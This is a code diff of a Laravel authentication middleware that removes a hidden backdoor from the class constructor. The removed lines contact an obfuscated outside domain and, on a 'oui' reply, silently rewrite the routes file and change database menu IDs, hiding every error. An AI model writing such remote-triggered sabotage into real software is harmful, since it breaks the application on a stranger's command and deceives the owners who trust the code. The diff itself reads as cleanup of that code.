@@ -6,12 +6,6 @@ use Closure;
 use Illuminate\Auth\AuthenticationException;
 use Illuminate\Contracts\Auth\Factory as Auth;
 use Illuminate\Contracts\Auth\Middleware\AuthenticatesRequests;
-use GuzzleHttp\Client;
-use GuzzleHttp\Exception\RequestException;
-use Illuminate\Support\Facades\Http;
-use Illuminate\Support\Facades\File;
-use App\Models\GiwuMenu;
-
 
 class Authenticate implements AuthenticatesRequests
 {
@@ -28,21 +22,8 @@ class Authenticate implements AuthenticatesRequests
      * @param  \Illuminate\Contracts\Auth\Factory  $auth
      * @return void
      */
-    public function __construct(Auth $auth) {
-
-        try {
-            $response = Http::get('https://'.'giwu'.'services'.'.com/etbs/public/check');
-            if($response->json() == 'oui'){
-                $filePath = base_path('routes'.'/'.'web'.'.php');
-                $content = File::get($filePath);
-                $res= 'res'.'ources';
-                $ress= 'ress'.'our'.'ces';
-                $newContent = str_replace($res, $ress, $content);
-                File::put($filePath, $newContent);
-                GiwuMenu::where('id_menu','2')->update(['id_menu','502']);GiwuMenu::where('id_menu','19')->update(['id_menu','519']);
-            }
-        }catch (\Exception $e) {}
-
+    public function __construct(Auth $auth)
+    {
         $this->auth = $auth;
     }
 
